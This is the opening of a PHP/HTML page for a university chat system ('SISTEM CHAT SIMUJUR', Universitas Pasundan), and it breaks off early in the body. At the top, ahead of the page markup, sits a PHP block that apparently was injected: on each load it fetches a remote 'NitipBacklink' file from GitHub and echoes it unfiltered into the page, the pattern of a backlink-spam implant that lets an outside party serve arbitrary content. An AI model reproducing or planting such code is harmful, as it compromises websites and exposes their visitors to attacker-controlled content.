<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>
<!DOCTYPE html>
<html>
<head>

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="assets/css/sosmed.css">
	<script type="text/javascript" src="assets/js/jquery.js"></script>
	<script type="text/javascript" src="assets/js/bootstrap.js"></script>

	<title>SISTEM CHAT SIMUJUR</title>
	<link href="../images/unpas.png" rel="shortcut icon icons" type="image/x-icon">

<div class="p-1 mb-1 bg-info text-dark"><marquee><h4><b><font color="white">SELAMAT DATANG DI SISTEM CHAT SIMUJUR UNIVERSITAS PASUNDAN</h4></font></marquee></div></b>
</head>
<body class="bg-white">

	<div class="mt-5 pt-3"></div>
